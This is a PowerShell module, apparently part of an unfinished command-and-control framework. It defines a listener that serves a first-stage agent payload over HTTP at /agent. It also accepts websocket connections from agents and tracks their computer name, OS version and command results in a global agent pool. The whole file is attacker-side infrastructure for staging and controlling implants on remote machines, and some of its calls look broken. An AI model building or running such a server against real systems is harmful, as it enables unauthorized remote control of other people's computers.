#
# New_Listerner.psm1
#
Function Global:New-Listerner()
{
	param
	(
		[Parameter()]
		[String]$ListerName,

		[Parameter()]
		[system.net.ipaddress]$LHOST = [system.net.ipaddress]::Loopback,

		[Parameter()]
		[ValidateRange(1, 65535)]
		[int]$LPORT,

		[Parameter()]
		[String]$PSK,

		[Parameter()]
		[ValidateSet("Staged","Stageless")]
		[String]$StageType

	)

	# If global lister object doesnt exist,or is null - create one
	if(!($Global:ListernerPool)){
		$Global:ListernerPool = @()
	}
	# If global agent object doesnt exist,or is null - create one
	if(!($Global:AgentPool)){
		$Global:AgentPool = @()
	}

	# Build a simple TCP listerner
	<#
		[console]::Title = ("Server: $LHOST : $LPORT")
		$endpoint        = new-object System.Net.IPEndPoint ($LHOST, $LPORT)
		$listener        = new-object System.Net.Sockets.TcpListener $endpoint
		$listener.start()
	#>

	# Create a template listerner object
	$obj = [pscustomobject]@{
		Name       = [String]$ListerName
		UUID       = [String](New-Guid).Guid
		LHOST      = [system.net.ipaddress]$LHOST
		LPORT      = [int]$LPORT
		RAWSOCK    = [Collections.Generic.List[Object]]$listener
		isStaged   = $false
		PSK        = $PSK
	}
	# add listerner psobject to array
	$Global:ListernerPool += $obj

	# add a runspace here (yes we are nesting)
	# add it once the listerner works. when its working, we can shove it into the background so the powershell terminal is free again.

	$http = [System.Net.HttpListener]::new() 
	$http.Prefixes.Add("http://$LHOST`:$LPORT/")
	$http.Prefixes.Add("http://$LHOST`:$LPORT/agent")
	$http.Start()

	while ($http.IsListening) {

		# Get Request Url
		# When a request is made in a web browser the GetContext() method will return a request object
		# Our route examples below will use the request object properties to decide how to respond
		$context = $http.GetContext()
		if($context.Request.IsWebSocketRequest)
		{
			# handle websocket (second stage)
			write-host "Agent connection: $($context.Request.UserHostAddress)  =>  $($context.Request.Url)" -f 'mag'

			$wsSync   = $context.AcceptWebSocketAsync("null").GetAwaiter().GetResult()
			
			#$ws.WebSocket
			$websocket = $wsSync.WebSocket
			
			$Agent = [PSCustomObject]@{
					# required information
					UUID             = (New-Guid).Guid
					RAWConnection    = [Object]$websocket
					AGENTIP          = $context.Request.RemoteEndPoint.Address.ToString()

					# information enumerated
					ComputerName     = [String]""
					OSVersion        = [String]""
					LastSeen         = [String](get-date) 
					ExecutionPath    = [String]""
					ExecutionContext = [String]""
					
					#Make these methods. so we can call Agent.SendData() or something.
					# rsults sent back from commands
					ResponseQueue     = @()

					# objects to interact with
					StreamReader     = $websocket.ReceiveAsync()
					StreamWriter     = $websocket.SendAsync()
				}
				
				$Global:AgentPool += $Agent
				$Global:AgentPool

		}
		if($context.Request.HttpMethod -eq 'GET' -and $context.Request.RawUrl -eq '/agent')
		{
			# handle http get request (first stage)
			write-host "Staging: $($context.Request.UserHostAddress)  =>  $($context.Request.Url)" -f 'mag'
		    [string] $html = (New-Agent -Listerner $obj -StageType Stageless).toString()

			#resposed to the request
			$buffer = [System.Text.Encoding]::UTF8.GetBytes($html) # convert htmtl to bytes
			$context.Response.ContentLength64 = $buffer.Length
			$context.Response.OutputStream.Write($buffer, 0, $buffer.Length) #stream to broswer
			$context.Response.OutputStream.Close() # close the response
		}

		
		
	}


	$http.Stop();

	

}